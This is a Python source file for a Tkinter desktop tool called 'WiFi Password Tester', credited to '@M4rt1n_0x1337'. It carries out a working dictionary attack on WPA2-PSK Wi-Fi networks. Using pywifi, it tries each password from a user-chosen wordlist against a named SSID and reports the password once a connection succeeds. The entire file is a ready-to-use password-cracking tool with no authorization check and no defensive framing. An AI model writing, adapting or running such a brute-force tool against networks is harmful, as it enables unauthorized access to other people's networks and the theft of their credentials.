import tkinter as tk
from tkinter import filedialog, ttk, messagebox
import time
from pywifi import PyWiFi, const, Profile
import threading
import os

class WifiTesterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Password Tester")
        self.root.geometry("500x500")
        self.root.configure(bg='#f0f0f0')

        
        main_frame = ttk.Frame(root, padding="20")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        
        title_label = ttk.Label(main_frame, text="WiFi Password Tester", font=('Helvetica', 16, 'bold'))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 5))

        
        author_label = ttk.Label(main_frame, text="by @M4rt1n_0x1337", font=('Helvetica', 10), foreground='blue')
        author_label.grid(row=1, column=0, columnspan=3, pady=(0, 20))
        
        
        ttk.Label(main_frame, text="Nombre de Red (SSID):").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.ssid_entry = ttk.Entry(main_frame, width=40)
        self.ssid_entry.grid(row=2, column=1, columnspan=2, sticky=tk.W, pady=5)
        
        
        ttk.Label(main_frame, text="Select Dictionary File:").grid(row=3, column=0, sticky=tk.W, pady=5)
        self.file_path_var = tk.StringVar()
        self.file_path_entry = ttk.Entry(main_frame, textvariable=self.file_path_var, width=30)
        self.file_path_entry.grid(row=3, column=1, sticky=tk.W, pady=5)
        
        self.browse_button = ttk.Button(main_frame, text="Buscar", command=self.browse_file)
        self.browse_button.grid(row=3, column=2, sticky=tk.W, pady=5, padx=5)
        
        
        self.progress_var = tk.StringVar(value="")
        self.progress_label = ttk.Label(main_frame, textvariable=self.progress_var)
        self.progress_label.grid(row=4, column=0, columnspan=3, pady=10)
        
        self.progress_bar = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress_bar.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)
        
        
        self.result_text = tk.Text(main_frame, height=10, width=50)
        self.result_text.grid(row=6, column=0, columnspan=3, pady=10)
        
        
        self.start_button = ttk.Button(main_frame, text="Start Testing", command=self.start_testing)
        self.start_button.grid(row=7, column=0, columnspan=3, pady=10)
        
        
        self.is_testing = False
        
    def browse_file(self):
        filename = filedialog.askopenfilename(
            title="Select Dictionary File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if filename:
            self.file_path_var.set(filename)
            
    def update_progress(self, message):
        self.progress_var.set(message)
        self.result_text.insert(tk.END, message + "\n")
        self.result_text.see(tk.END)
        
    def connect_to_wifi(self, ssid, password_file):
        try:
            wifi = PyWiFi()
            iface = wifi.interfaces()[0]
            
            iface.disconnect()
            time.sleep(1)
            
            if iface.status() == const.IFACE_DISCONNECTED:
                profile = Profile()
                profile.ssid = ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                
                iface.remove_all_network_profiles()
                
                with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for password in f:
                        if not self.is_testing:
                            break
                            
                        password = password.strip()
                        self.update_progress(f"Testing password: {password}")
                        
                        profile.key = password
                        tmp_profile = iface.add_network_profile(profile)
                        iface.connect(tmp_profile)
                        time.sleep(5)
                        
                        if iface.status() == const.IFACE_CONNECTED:
                            self.update_progress(f"SUCCESS! Connected to {ssid} with password: {password}")
                            return True
                        else:
                            self.update_progress(f"Failed with password: {password}")
                            iface.disconnect()
                            
                self.update_progress("No valid password found in dictionary")
                return False
            else:
                self.update_progress("Already connected to a network")
                return True
                
        except Exception as e:
            self.update_progress(f"Error: {str(e)}")
            return False
            
    def start_testing(self):
        if not self.is_testing:
            ssid = self.ssid_entry.get().strip()
            password_file = self.file_path_var.get().strip()
            
            if not ssid:
                messagebox.showerror("Error", "Please enter a network name (SSID)")
                return
                
            if not password_file or not os.path.exists(password_file):
                messagebox.showerror("Error", "Please select a valid dictionary file")
                return
                
            self.is_testing = True
            self.start_button.configure(text="Stop Test")
            self.result_text.delete(1.0, tk.END)
            self.progress_bar.start()
            
            # Start testing in a separate thread
            self.test_thread = threading.Thread(
                target=self.run_test,
                args=(ssid, password_file)
            )
            self.test_thread.start()
        else:
            self.stop_testing()
            
    def stop_testing(self):
        self.is_testing = False
        self.start_button.configure(text="Start Testing")
        self.progress_bar.stop()
        self.update_progress("Testing stopped by user")
        
    def run_test(self, ssid, password_file):
        try:
            self.connect_to_wifi(ssid, password_file)
        finally:
            self.is_testing = False
            self.root.after(0, self.progress_bar.stop)
            self.root.after(0, lambda: self.start_button.configure(text="Start Testing"))

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiTesterGUI(root)
    root.mainloop()